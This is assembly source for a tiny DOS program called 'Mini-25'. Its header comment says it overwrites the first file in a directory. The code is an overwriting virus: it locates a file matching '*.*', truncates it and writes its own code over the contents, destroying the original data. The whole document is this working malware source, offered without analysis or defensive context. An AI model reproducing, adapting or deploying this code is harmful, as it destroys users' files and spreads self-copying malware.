;
; Mini-25
;
; Overwrites the first file in a directory


FNAM            Equ 09eh

                Db '*.*',0
Main:           Mov Ah,4eh
                Mov Dx,Cx
                Int 21h
                Mov Ah,3ch
                Lea Dx,FNAM
On2:            Int 21h
                Mov Bh,40h
                Xchg Cx,Dx
                Xchg Ax,Bx
                Jmp On2
Length          Equ $-Main
